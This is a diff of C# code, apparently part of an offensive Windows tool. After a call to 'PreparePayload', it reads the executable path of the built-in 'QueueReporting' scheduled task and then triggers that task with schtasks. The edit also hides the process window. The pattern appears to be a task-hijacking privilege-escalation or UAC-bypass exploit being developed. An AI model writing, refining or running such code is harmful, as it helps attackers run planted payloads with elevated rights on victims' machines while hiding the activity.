@@ -282,16 +282,28 @@ if($r-eq 0){
 
         PreparePayload(runDir);
 
-        /* Check the task exists and capture any trigger error */
+        /* Query the task XML to see the actual executable path */
+        var qpsi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
+            @"/query /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting"" /xml")
+            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
+        string xml = "";
+        using(var p=System.Diagnostics.Process.Start(qpsi))
+            xml = p.StandardOutput.ReadToEnd();
+        /* Extract just the Command line from XML */
+        int ci = xml.IndexOf("<Command>"), ce = xml.IndexOf("</Command>");
+        string taskExe = (ci>=0&&ce>ci) ? xml.Substring(ci+9,ce-ci-9) : "(not found)";
+        Console.WriteLine($"[+] Task exe: {taskExe}");
+
+        /* Trigger */
         var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
             @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
-            {UseShellExecute=false,CreateNoWindow=false,RedirectStandardOutput=true,RedirectStandardError=true};
+            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
         string taskOut = "";
         using(var p=System.Diagnostics.Process.Start(psi)) {
             taskOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
             p.WaitForExit(5000);
         }
-        Console.WriteLine($"[+] schtasks: {taskOut.Trim()}");
+        Console.WriteLine($"[+] schtasks run: {taskOut.Trim()}");
         return true;
     }
 
